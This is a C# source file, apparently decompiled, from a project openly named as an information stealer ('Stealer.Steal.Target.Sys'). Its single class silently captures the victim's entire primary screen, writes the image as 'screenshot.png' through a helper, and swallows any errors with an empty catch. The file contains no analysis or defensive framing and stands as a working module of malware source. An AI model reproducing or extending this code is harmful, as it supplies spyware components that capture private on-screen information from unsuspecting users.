using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class ScreenShot
{
	public static void Start()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap val = new Bitmap(width, height, (PixelFormat)2498570);
			Graphics obj = Graphics.FromImage((Image)(object)val);
			obj.CopyFromScreen(0, 0, 0, 0, new Size(width, height), (CopyPixelOperation)13369376);
			obj.Dispose();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				((Image)val).Save((Stream)memoryStream, ImageFormat.Png);
				DynamicFiles.WriteAllBytes("screenshot.png", memoryStream.ToArray());
			}
			((Image)val).Dispose();
		}
		catch
		{
		}
	}
}
